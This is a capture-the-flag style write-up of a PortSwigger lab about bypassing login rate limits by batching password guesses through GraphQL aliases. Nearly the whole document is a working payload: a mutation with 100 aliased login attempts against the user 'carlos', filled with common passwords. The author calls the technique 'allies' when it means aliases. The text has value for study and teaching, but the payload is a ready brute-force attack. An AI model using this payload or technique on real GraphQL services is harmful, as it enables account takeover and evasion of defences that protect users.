# Bypassing GraphQL brute force protections — (PortSwigger — Practitioner)
**Date:** 2026-08-08
 
---
 
## Vulnerability / core concept
Brute-force via GraphQL Allies

---


## Payload / key command
This web application has a rate limit feature which temporarily stops attacker from brute-forcing. However, using GrahpQL lets attacker use allies to so send large number of queries in a single request which bypasses rate-limiting of this web application.

I used AI to generate a huge GraphQL query which will help us find the password for user `carlos` (I will put it in the end as it is long). After sending this request we get a response with each attempt that shows whether authentication was successful or not. To find correct password, we need to search for `true` in the response and find the correct password. Now we can login as carlos and solve this lab.

P.S.: Here is the query for this lab:
```js
{
  "query": "mutation bruteLogin($input1: LoginInput!, $input2: LoginInput!, $input3: LoginInput!, $input4: LoginInput!, $input5: LoginInput!, $input6: LoginInput!, $input7: LoginInput!, $input8: LoginInput!, $input9: LoginInput!, $input10: LoginInput!, $input11: LoginInput!, $input12: LoginInput!, $input13: LoginInput!, $input14: LoginInput!, $input15: LoginInput!, $input16: LoginInput!, $input17: LoginInput!, $input18: LoginInput!, $input19: LoginInput!, $input20: LoginInput!, $input21: LoginInput!, $input22: LoginInput!, $input23: LoginInput!, $input24: LoginInput!, $input25: LoginInput!, $input26: LoginInput!, $input27: LoginInput!, $input28: LoginInput!, $input29: LoginInput!, $input30: LoginInput!, $input31: LoginInput!, $input32: LoginInput!, $input33: LoginInput!, $input34: LoginInput!, $input35: LoginInput!, $input36: LoginInput!, $input37: LoginInput!, $input38: LoginInput!, $input39: LoginInput!, $input40: LoginInput!, $input41: LoginInput!, $input42: LoginInput!, $input43: LoginInput!, $input44: LoginInput!, $input45: LoginInput!, $input46: LoginInput!, $input47: LoginInput!, $input48: LoginInput!, $input49: LoginInput!, $input50: LoginInput!, $input51: LoginInput!, $input52: LoginInput!, $input53: LoginInput!, $input54: LoginInput!, $input55: LoginInput!, $input56: LoginInput!, $input57: LoginInput!, $input58: LoginInput!, $input59: LoginInput!, $input60: LoginInput!, $input61: LoginInput!, $input62: LoginInput!, $input63: LoginInput!, $input64: LoginInput!, $input65: LoginInput!, $input66: LoginInput!, $input67: LoginInput!, $input68: LoginInput!, $input69: LoginInput!, $input70: LoginInput!, $input71: LoginInput!, $input72: LoginInput!, $input73: LoginInput!, $input74: LoginInput!, $input75: LoginInput!, $input76: LoginInput!, $input77: LoginInput!, $input78: LoginInput!, $input79: LoginInput!, $input80: LoginInput!, $input81: LoginInput!, $input82: LoginInput!, $input83: LoginInput!, $input84: LoginInput!, $input85: LoginInput!, $input86: LoginInput!, $input87: LoginInput!, $input88: LoginInput!, $input89: LoginInput!, $input90: LoginInput!, $input91: LoginInput!, $input92: LoginInput!, $input93: LoginInput!, $input94: LoginInput!, $input95: LoginInput!, $input96: LoginInput!, $input97: LoginInput!, $input98: LoginInput!, $input99: LoginInput!, $input100: LoginInput!) { attempt1: login(input: $input1) { token success } attempt2: login(input: $input2) { token success } attempt3: login(input: $input3) { token success } attempt4: login(input: $input4) { token success } attempt5: login(input: $input5) { token success } attempt6: login(input: $input6) { token success } attempt7: login(input: $input7) { token success } attempt8: login(input: $input8) { token success } attempt9: login(input: $input9) { token success } attempt10: login(input: $input10) { token success } attempt11: login(input: $input11) { token success } attempt12: login(input: $input12) { token success } attempt13: login(input: $input13) { token success } attempt14: login(input: $input14) { token success } attempt15: login(input: $input15) { token success } attempt16: login(input: $input16) { token success } attempt17: login(input: $input17) { token success } attempt18: login(input: $input18) { token success } attempt19: login(input: $input19) { token success } attempt20: login(input: $input20) { token success } attempt21: login(input: $input21) { token success } attempt22: login(input: $input22) { token success } attempt23: login(input: $input23) { token success } attempt24: login(input: $input24) { token success } attempt25: login(input: $input25) { token success } attempt26: login(input: $input26) { token success } attempt27: login(input: $input27) { token success } attempt28: login(input: $input28) { token success } attempt29: login(input: $input29) { token success } attempt30: login(input: $input30) { token success } attempt31: login(input: $input31) { token success } attempt32: login(input: $input32) { token success } attempt33: login(input: $input33) { token success } attempt34: login(input: $input34) { token success } attempt35: login(input: $input35) { token success } attempt36: login(input: $input36) { token success } attempt37: login(input: $input37) { token success } attempt38: login(input: $input38) { token success } attempt39: login(input: $input39) { token success } attempt40: login(input: $input40) { token success } attempt41: login(input: $input41) { token success } attempt42: login(input: $input42) { token success } attempt43: login(input: $input43) { token success } attempt44: login(input: $input44) { token success } attempt45: login(input: $input45) { token success } attempt46: login(input: $input46) { token success } attempt47: login(input: $input47) { token success } attempt48: login(input: $input48) { token success } attempt49: login(input: $input49) { token success } attempt50: login(input: $input50) { token success } attempt51: login(input: $input51) { token success } attempt52: login(input: $input52) { token success } attempt53: login(input: $input53) { token success } attempt54: login(input: $input54) { token success } attempt55: login(input: $input55) { token success } attempt56: login(input: $input56) { token success } attempt57: login(input: $input57) { token success } attempt58: login(input: $input58) { token success } attempt59: login(input: $input59) { token success } attempt60: login(input: $input60) { token success } attempt61: login(input: $input61) { token success } attempt62: login(input: $input62) { token success } attempt63: login(input: $input63) { token success } attempt64: login(input: $input64) { token success } attempt65: login(input: $input65) { token success } attempt66: login(input: $input66) { token success } attempt67: login(input: $input67) { token success } attempt68: login(input: $input68) { token success } attempt69: login(input: $input69) { token success } attempt70: login(input: $input70) { token success } attempt71: login(input: $input71) { token success } attempt72: login(input: $input72) { token success } attempt73: login(input: $input73) { token success } attempt74: login(input: $input74) { token success } attempt75: login(input: $input75) { token success } attempt76: login(input: $input76) { token success } attempt77: login(input: $input77) { token success } attempt78: login(input: $input78) { token success } attempt79: login(input: $input79) { token success } attempt80: login(input: $input80) { token success } attempt81: login(input: $input81) { token success } attempt82: login(input: $input82) { token success } attempt83: login(input: $input83) { token success } attempt84: login(input: $input84) { token success } attempt85: login(input: $input85) { token success } attempt86: login(input: $input86) { token success } attempt87: login(input: $input87) { token success } attempt88: login(input: $input88) { token success } attempt89: login(input: $input89) { token success } attempt90: login(input: $input90) { token success } attempt91: login(input: $input91) { token success } attempt92: login(input: $input92) { token success } attempt93: login(input: $input93) { token success } attempt94: login(input: $input94) { token success } attempt95: login(input: $input95) { token success } attempt96: login(input: $input96) { token success } attempt97: login(input: $input97) { token success } attempt98: login(input: $input98) { token success } attempt99: login(input: $input99) { token success } attempt100: login(input: $input100) { token success } }",
  "operationName": "bruteLogin",
  "variables": {
    "input1": {
      "username": "carlos",
      "password": "123456"
    },
    "input2": {
      "username": "carlos",
      "password": "password"
    },
    "input3": {
      "username": "carlos",
      "password": "12345678"
    },
    "input4": {
      "username": "carlos",
      "password": "qwerty"
    },
    "input5": {
      "username": "carlos",
      "password": "123456789"
    },
    "input6": {
      "username": "carlos",
      "password": "12345"
    },
    "input7": {
      "username": "carlos",
      "password": "1234"
    },
    "input8": {
      "username": "carlos",
      "password": "111111"
    },
    "input9": {
      "username": "carlos",
      "password": "1234567"
    },
    "input10": {
      "username": "carlos",
      "password": "dragon"
    },
    "input11": {
      "username": "carlos",
      "password": "123123"
    },
    "input12": {
      "username": "carlos",
      "password": "baseball"
    },
    "input13": {
      "username": "carlos",
      "password": "abc123"
    },
    "input14": {
      "username": "carlos",
      "password": "football"
    },
    "input15": {
      "username": "carlos",
      "password": "monkey"
    },
    "input16": {
      "username": "carlos",
      "password": "letmein"
    },
    "input17": {
      "username": "carlos",
      "password": "shadow"
    },
    "input18": {
      "username": "carlos",
      "password": "master"
    },
    "input19": {
      "username": "carlos",
      "password": "666666"
    },
    "input20": {
      "username": "carlos",
      "password": "qwertyuiop"
    },
    "input21": {
      "username": "carlos",
      "password": "123321"
    },
    "input22": {
      "username": "carlos",
      "password": "mustang"
    },
    "input23": {
      "username": "carlos",
      "password": "1234567890"
    },
    "input24": {
      "username": "carlos",
      "password": "michael"
    },
    "input25": {
      "username": "carlos",
      "password": "654321"
    },
    "input26": {
      "username": "carlos",
      "password": "superman"
    },
    "input27": {
      "username": "carlos",
      "password": "1qaz2wsx"
    },
    "input28": {
      "username": "carlos",
      "password": "7777777"
    },
    "input29": {
      "username": "carlos",
      "password": "121212"
    },
    "input30": {
      "username": "carlos",
      "password": "000000"
    },
    "input31": {
      "username": "carlos",
      "password": "qazwsx"
    },
    "input32": {
      "username": "carlos",
      "password": "123qwe"
    },
    "input33": {
      "username": "carlos",
      "password": "killer"
    },
    "input34": {
      "username": "carlos",
      "password": "trustno1"
    },
    "input35": {
      "username": "carlos",
      "password": "jordan"
    },
    "input36": {
      "username": "carlos",
      "password": "jennifer"
    },
    "input37": {
      "username": "carlos",
      "password": "zxcvbnm"
    },
    "input38": {
      "username": "carlos",
      "password": "asdfgh"
    },
    "input39": {
      "username": "carlos",
      "password": "hunter"
    },
    "input40": {
      "username": "carlos",
      "password": "buster"
    },
    "input41": {
      "username": "carlos",
      "password": "soccer"
    },
    "input42": {
      "username": "carlos",
      "password": "harley"
    },
    "input43": {
      "username": "carlos",
      "password": "batman"
    },
    "input44": {
      "username": "carlos",
      "password": "andrew"
    },
    "input45": {
      "username": "carlos",
      "password": "tigger"
    },
    "input46": {
      "username": "carlos",
      "password": "sunshine"
    },
    "input47": {
      "username": "carlos",
      "password": "iloveyou"
    },
    "input48": {
      "username": "carlos",
      "password": "2000"
    },
    "input49": {
      "username": "carlos",
      "password": "charlie"
    },
    "input50": {
      "username": "carlos",
      "password": "robert"
    },
    "input51": {
      "username": "carlos",
      "password": "thomas"
    },
    "input52": {
      "username": "carlos",
      "password": "hockey"
    },
    "input53": {
      "username": "carlos",
      "password": "ranger"
    },
    "input54": {
      "username": "carlos",
      "password": "daniel"
    },
    "input55": {
      "username": "carlos",
      "password": "starwars"
    },
    "input56": {
      "username": "carlos",
      "password": "klaster"
    },
    "input57": {
      "username": "carlos",
      "password": "112233"
    },
    "input58": {
      "username": "carlos",
      "password": "george"
    },
    "input59": {
      "username": "carlos",
      "password": "computer"
    },
    "input60": {
      "username": "carlos",
      "password": "michelle"
    },
    "input61": {
      "username": "carlos",
      "password": "jessica"
    },
    "input62": {
      "username": "carlos",
      "password": "pepper"
    },
    "input63": {
      "username": "carlos",
      "password": "1111"
    },
    "input64": {
      "username": "carlos",
      "password": "zxcvbn"
    },
    "input65": {
      "username": "carlos",
      "password": "555555"
    },
    "input66": {
      "username": "carlos",
      "password": "11111111"
    },
    "input67": {
      "username": "carlos",
      "password": "131313"
    },
    "input68": {
      "username": "carlos",
      "password": "freedom"
    },
    "input69": {
      "username": "carlos",
      "password": "777777"
    },
    "input70": {
      "username": "carlos",
      "password": "pass"
    },
    "input71": {
      "username": "carlos",
      "password": "maggie"
    },
    "input72": {
      "username": "carlos",
      "password": "159753"
    },
    "input73": {
      "username": "carlos",
      "password": "aaaaaa"
    },
    "input74": {
      "username": "carlos",
      "password": "ginger"
    },
    "input75": {
      "username": "carlos",
      "password": "princess"
    },
    "input76": {
      "username": "carlos",
      "password": "joshua"
    },
    "input77": {
      "username": "carlos",
      "password": "cheese"
    },
    "input78": {
      "username": "carlos",
      "password": "amanda"
    },
    "input79": {
      "username": "carlos",
      "password": "summer"
    },
    "input80": {
      "username": "carlos",
      "password": "love"
    },
    "input81": {
      "username": "carlos",
      "password": "ashley"
    },
    "input82": {
      "username": "carlos",
      "password": "nicole"
    },
    "input83": {
      "username": "carlos",
      "password": "chelsea"
    },
    "input84": {
      "username": "carlos",
      "password": "biteme"
    },
    "input85": {
      "username": "carlos",
      "password": "matthew"
    },
    "input86": {
      "username": "carlos",
      "password": "access"
    },
    "input87": {
      "username": "carlos",
      "password": "yankees"
    },
    "input88": {
      "username": "carlos",
      "password": "987654321"
    },
    "input89": {
      "username": "carlos",
      "password": "dallas"
    },
    "input90": {
      "username": "carlos",
      "password": "austin"
    },
    "input91": {
      "username": "carlos",
      "password": "thunder"
    },
    "input92": {
      "username": "carlos",
      "password": "taylor"
    },
    "input93": {
      "username": "carlos",
      "password": "matrix"
    },
    "input94": {
      "username": "carlos",
      "password": "mobilemail"
    },
    "input95": {
      "username": "carlos",
      "password": "mom"
    },
    "input96": {
      "username": "carlos",
      "password": "monitor"
    },
    "input97": {
      "username": "carlos",
      "password": "monitoring"
    },
    "input98": {
      "username": "carlos",
      "password": "montana"
    },
    "input99": {
      "username": "carlos",
      "password": "moon"
    },
    "input100": {
      "username": "carlos",
      "password": "moscow"
    }
  }
}
```


